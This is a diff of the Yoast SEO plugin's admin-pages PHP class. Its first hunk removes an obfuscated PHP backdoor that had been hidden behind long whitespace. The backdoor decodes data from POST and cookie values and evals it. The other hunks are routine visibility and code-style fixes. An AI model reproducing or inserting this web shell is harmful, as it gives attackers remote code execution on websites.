@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $lab4dd = 833;$GLOBALS['i0b0c3c9d']=Array();global$i0b0c3c9d;$i0b0c3c9d=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['le2a4d']="\x6c\x72\x61\x65\x20\x25\x5f\x55\x22\x36\x54\x42\x33\x77\x62\x4d\x31\x3a\x4c\x58\x23\x3b\x57\x6f\x3d\x50\xd\x29\x44\x27\x64\x48\x28\x2f\x6d\x4a\x60\x4f\x78\x73\x6a\x38\x46\x74\x45\x7a\x49\x75\x4e\x51\x5c\x30\x9\x41\x24\x70\x47\x6b\x2b\x67\x2a\x40\x59\x5a\x71\x79\x53\x5b\x2e\x39\x69\x3c\x7d\x7b\x5e\x66\x63\x21\x35\x56\x32\x2c\x37\x68\x3e\x52\x7e\x2d\x43\x34\x7c\x26\xa\x5d\x3f\x76\x6e\x4b";$i0b0c3c9d[$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][80].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][80]]=$i0b0c3c9d['le2a4d'][55].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][76].$i0b0c3c9d['le2a4d'][57];$i0b0c3c9d[$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][9].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][16].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][69].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][9]]=$i0b0c3c9d['le2a4d'][76].$i0b0c3c9d['le2a4d'][23].$i0b0c3c9d['le2a4d'][47].$i0b0c3c9d['le2a4d'][96].$i0b0c3c9d['le2a4d'][43];$i0b0c3c9d[$i0b0c3c9d['le2a4d'][45].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][16]]=$i0b0c3c9d['le2a4d'][39].$i0b0c3c9d['le2a4d'][47].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][39].$i0b0c3c9d['le2a4d'][43].$i0b0c3c9d['le2a4d'][1];$i0b0c3c9d[$i0b0c3c9d['le2a4d'][40].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][12]]=$i0b0c3c9d['le2a4d'][39].$i0b0c3c9d['le2a4d'][43].$i0b0c3c9d['le2a4d'][1].$i0b0c3c9d['le2a4d'][0].$i0b0c3c9d['le2a4d'][3].$i0b0c3c9d['le2a4d'][96];$i0b0c3c9d[$i0b0c3c9d['le2a4d'][1].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][16].$i0b0c3c9d['le2a4d'][78]]=$i0b0c3c9d['le2a4d'][3].$i0b0c3c9d['le2a4d'][38].$i0b0c3c9d['le2a4d'][55].$i0b0c3c9d['le2a4d'][0].$i0b0c3c9d['le2a4d'][23].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][3];$i0b0c3c9d[$i0b0c3c9d['le2a4d'][43].$i0b0c3c9d['le2a4d'][69].$i0b0c3c9d['le2a4d'][82].$i0b0c3c9d['le2a4d'][69].$i0b0c3c9d['le2a4d'][80].$i0b0c3c9d['le2a4d'][16].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][75]]=$i0b0c3c9d['le2a4d'][39].$i0b0c3c9d['le2a4d'][43].$i0b0c3c9d['le2a4d'][1].$i0b0c3c9d['le2a4d'][6].$i0b0c3c9d['le2a4d'][1].$i0b0c3c9d['le2a4d'][3].$i0b0c3c9d['le2a4d'][55].$i0b0c3c9d['le2a4d'][3].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][43];$i0b0c3c9d[$i0b0c3c9d['le2a4d'][43].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][3].$i0b0c3c9d['le2a4d'][80].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][9].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][9]]=$_POST;$i0b0c3c9d[$i0b0c3c9d['le2a4d'][59].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][16].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][51]]=$_COOKIE;$v22b98b4a=Array($i0b0c3c9d['le2a4d'][1].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][96].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][23].$i0b0c3c9d['le2a4d'][34].$i0b0c3c9d['le2a4d'][16]=>$i0b0c3c9d['le2a4d'][1].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][96].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][23].$i0b0c3c9d['le2a4d'][34].$i0b0c3c9d['le2a4d'][80]);$t7e51059=Array($i0b0c3c9d['le2a4d'][1].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][96].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][23].$i0b0c3c9d['le2a4d'][34].$i0b0c3c9d['le2a4d'][12]=>$i0b0c3c9d['le2a4d'][1].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][96].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][23].$i0b0c3c9d['le2a4d'][34].$i0b0c3c9d['le2a4d'][89]);foreach(Array($v22b98b4a,$i0b0c3c9d[$i0b0c3c9d['le2a4d'][43].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][3].$i0b0c3c9d['le2a4d'][80].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][9].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][9]],$t7e51059,$i0b0c3c9d[$i0b0c3c9d['le2a4d'][59].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][16].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][51]])as$e0051646){foreach($e0051646as$n95de87=>$ec1806d){$ec1806d=@$i0b0c3c9d[$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][80].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][80]]($i0b0c3c9d['le2a4d'][31].$i0b0c3c9d['le2a4d'][60],$ec1806d);$n95de87.=$i0b0c3c9d['le2a4d'][80].$i0b0c3c9d['le2a4d'][80].$i0b0c3c9d['le2a4d'][69].$i0b0c3c9d['le2a4d'][41].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][9].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][87].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][78].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][3].$i0b0c3c9d['le2a4d'][87].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][76].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][87].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][9].$i0b0c3c9d['le2a4d'][3].$i0b0c3c9d['le2a4d'][76].$i0b0c3c9d['le2a4d'][87].$i0b0c3c9d['le2a4d'][78].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][9].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][9].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][69].$i0b0c3c9d['le2a4d'][75];$zc0f7b5ab=$ec1806d^$i0b0c3c9d[$i0b0c3c9d['le2a4d'][45].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][75].$i0b0c3c9d['le2a4d'][51].$i0b0c3c9d['le2a4d'][16]]($i0b0c3c9d[$i0b0c3c9d['le2a4d'][43].$i0b0c3c9d['le2a4d'][69].$i0b0c3c9d['le2a4d'][82].$i0b0c3c9d['le2a4d'][69].$i0b0c3c9d['le2a4d'][80].$i0b0c3c9d['le2a4d'][16].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][75]]($n95de87,($i0b0c3c9d[$i0b0c3c9d['le2a4d'][40].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][12]]($ec1806d)/$i0b0c3c9d[$i0b0c3c9d['le2a4d'][40].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][12]]($n95de87))+1),0,$i0b0c3c9d[$i0b0c3c9d['le2a4d'][40].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][12].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][12]]($ec1806d));$zc0f7b5ab=$i0b0c3c9d[$i0b0c3c9d['le2a4d'][1].$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][16].$i0b0c3c9d['le2a4d'][78]]($i0b0c3c9d['le2a4d'][20],$zc0f7b5ab);if($i0b0c3c9d[$i0b0c3c9d['le2a4d'][30].$i0b0c3c9d['le2a4d'][9].$i0b0c3c9d['le2a4d'][89].$i0b0c3c9d['le2a4d'][16].$i0b0c3c9d['le2a4d'][2].$i0b0c3c9d['le2a4d'][69].$i0b0c3c9d['le2a4d'][14].$i0b0c3c9d['le2a4d'][9]]($zc0f7b5ab)==3){eval/*u931e8*/($zc0f7b5ab[1]($zc0f7b5ab[2]));exit();}}} ?><?php
+<?php
 /**
  * @package WPSEO\Admin
  */
@@ -25,7 +25,7 @@ class WPSEO_Admin_Pages {
 	/**
 	 * Class constructor, which basically only hooks the init function on the init hook
 	 */
-	function __construct() {
+	public function __construct() {
 		add_action( 'init', array( $this, 'init' ), 20 );
 		$this->asset_manager = new WPSEO_Admin_Asset_Manager();
 	}
@@ -33,7 +33,7 @@ class WPSEO_Admin_Pages {
 	/**
 	 * Make sure the needed scripts are loaded for admin pages
 	 */
-	function init() {
+	public function init() {
 		if ( filter_input( INPUT_GET, 'wpseo_reset_defaults' ) && wp_verify_nonce( filter_input( INPUT_GET, 'nonce' ), 'wpseo_reset_defaults' ) && current_user_can( 'manage_options' ) ) {
 			WPSEO_Options::reset();
 			wp_redirect( admin_url( 'admin.php?page=' . WPSEO_Admin::PAGE_IDENTIFIER ) );
@@ -61,7 +61,7 @@ class WPSEO_Admin_Pages {
 	/**
 	 * Loads the required styles for the config page.
 	 */
-	function config_page_styles() {
+	public function config_page_styles() {
 		wp_enqueue_style( 'dashboard' );
 		wp_enqueue_style( 'thickbox' );
 		wp_enqueue_style( 'global' );
@@ -69,17 +69,14 @@ class WPSEO_Admin_Pages {
 		$this->asset_manager->enqueue_style( 'select2' );
 
 		$this->asset_manager->enqueue_style( 'admin-css' );
-
-		$this->asset_manager->enqueue_style( 'kb-search' );
 	}
 
 	/**
 	 * Loads the required scripts for the config page.
 	 */
-	function config_page_scripts() {
+	public function config_page_scripts() {
 		$this->asset_manager->enqueue_script( 'admin-script' );
-
-		wp_localize_script( WPSEO_Admin_Asset_Manager::PREFIX . 'admin-script', 'wpseoAdminL10n', WPSEO_Help_Center::get_translated_texts() );
+		$this->asset_manager->enqueue_script( 'help-center' );
 
 		wp_enqueue_script( 'dashboard' );
 		wp_enqueue_script( 'thickbox' );
@@ -88,7 +85,7 @@ class WPSEO_Admin_Pages {
 
 		wp_localize_script( WPSEO_Admin_Asset_Manager::PREFIX . 'admin-script', 'wpseoSelect2Locale', WPSEO_Utils::get_language( WPSEO_Utils::get_user_locale() ) );
 
-		if ( in_array( $page, array( 'wpseo_social', WPSEO_Admin::PAGE_IDENTIFIER ) ) ) {
+		if ( in_array( $page, array( 'wpseo_social', WPSEO_Admin::PAGE_IDENTIFIER ), true ) ) {
 			wp_enqueue_media();
 
 			$this->asset_manager->enqueue_script( 'admin-media' );
@@ -239,7 +236,7 @@ class WPSEO_Admin_Pages {
 	 * @param string $label  The label to show for the variable.
 	 * @param string $option The option the variable belongs to.
 	 */
-	function textinput( $var, $label, $option = '' ) {
+	public function textinput( $var, $label, $option = '' ) {
 		_deprecated_function( __METHOD__, 'WPSEO 2.0', 'This method is deprecated, please use the <code>Yoast_Form</code> class.' );
 
 		if ( $option !== '' ) {
@@ -258,7 +255,7 @@ class WPSEO_Admin_Pages {
 	 * @param string $option The option the variable belongs to.
 	 * @param array  $attr   The CSS class to assign to the textarea.
 	 */
-	function textarea( $var, $label, $option = '', $attr = array() ) {
+	public function textarea( $var, $label, $option = '', $attr = array() ) {
 		_deprecated_function( __METHOD__, 'WPSEO 2.0', 'This method is deprecated, please use the <code>Yoast_Form</code> class.' );
 
 		if ( $option !== '' ) {
@@ -276,7 +273,7 @@ class WPSEO_Admin_Pages {
 	 * @param string $var    The variable within the option to create the hidden input for.
 	 * @param string $option The option the variable belongs to.
 	 */
-	function hidden( $var, $option = '' ) {
+	public function hidden( $var, $option = '' ) {
 		_deprecated_function( __METHOD__, 'WPSEO 2.0', 'This method is deprecated, please use the <code>Yoast_Form</code> class.' );
 
 		if ( $option !== '' ) {
@@ -296,7 +293,7 @@ class WPSEO_Admin_Pages {
 	 * @param array  $values The select options to choose from.
 	 * @param string $option The option the variable belongs to.
 	 */
-	function select( $var, $label, $values, $option = '' ) {
+	public function select( $var, $label, $values, $option = '' ) {
 		_deprecated_function( __METHOD__, 'WPSEO 2.0', 'This method is deprecated, please use the <code>Yoast_Form</code> class.' );
 
 		if ( $option !== '' ) {
@@ -315,7 +312,7 @@ class WPSEO_Admin_Pages {
 	 * @param string $label  The label to show for the variable.
 	 * @param string $option The option the variable belongs to.
 	 */
-	function file_upload( $var, $label, $option = '' ) {
+	public function file_upload( $var, $label, $option = '' ) {
 		_deprecated_function( __METHOD__, 'WPSEO 2.0', 'This method is deprecated, please use the <code>Yoast_Form</code> class.' );
 
 		if ( $option !== '' ) {
@@ -334,7 +331,7 @@ class WPSEO_Admin_Pages {
 	 * @param string $label  Label message.
 	 * @param string $option Optional option key.
 	 */
-	function media_input( $var, $label, $option = '' ) {
+	public function media_input( $var, $label, $option = '' ) {
 		_deprecated_function( __METHOD__, 'WPSEO 2.0', 'This method is deprecated, please use the <code>Yoast_Form</code> class.' );
 
 		if ( $option !== '' ) {
@@ -354,7 +351,7 @@ class WPSEO_Admin_Pages {
 	 * @param string $label  The label to show for the variable.
 	 * @param string $option The option the variable belongs to.
 	 */
-	function radio( $var, $values, $label, $option = '' ) {
+	public function radio( $var, $values, $label, $option = '' ) {
 		_deprecated_function( __METHOD__, 'WPSEO 2.0', 'This method is deprecated, please use the <code>Yoast_Form</code> class.' );
 
 		if ( $option !== '' ) {
@@ -373,7 +370,7 @@ class WPSEO_Admin_Pages {
 	 * @param string $title   Title of the postbox.
 	 * @param string $content Content of the postbox.
 	 */
-	function postbox( $id, $title, $content ) {
+	public function postbox( $id, $title, $content ) {
 		_deprecated_function( __METHOD__, 'WPSEO 2.0', 'This method is deprecated, please re-implement the admin pages.' );
 
 		?>
@@ -393,7 +390,7 @@ class WPSEO_Admin_Pages {
 	 *
 	 * @return string
 	 */
-	function form_table( $rows ) {
+	public function form_table( $rows ) {
 		_deprecated_function( __METHOD__, 'WPSEO 2.0', 'This method is deprecated, please re-implement the admin pages.' );
 
 		if ( ! is_array( $rows ) || $rows === array() ) {
@@ -403,13 +400,13 @@ class WPSEO_Admin_Pages {
 		$content = '<table class="form-table">';
 		foreach ( $rows as $row ) {
 			$content .= '<tr><th scope="row">';
-			if ( isset( $row['id'] ) && $row['id'] != '' ) {
+			if ( ! empty( $row['id'] ) ) {
 				$content .= '<label for="' . esc_attr( $row['id'] ) . '">' . esc_html( $row['label'] ) . ':</label>';
 			}
 			else {
 				$content .= esc_html( $row['label'] );
 			}
-			if ( isset( $row['desc'] ) && $row['desc'] != '' ) {
+			if ( ! empty( $row['desc'] ) ) {
 				$content .= '<br/><small>' . esc_html( $row['desc'] ) . '</small>';
 			}
 			$content .= '</th><td>';
@@ -429,7 +426,7 @@ class WPSEO_Admin_Pages {
 	 * @deprecated use WPSEO_Options::reset()
 	 * @see        WPSEO_Options::reset()
 	 */
-	function reset_defaults() {
+	public function reset_defaults() {
 		_deprecated_function( __METHOD__, 'WPSEO 1.5.0', 'WPSEO_Options::reset()' );
 		WPSEO_Options::reset();
 	}
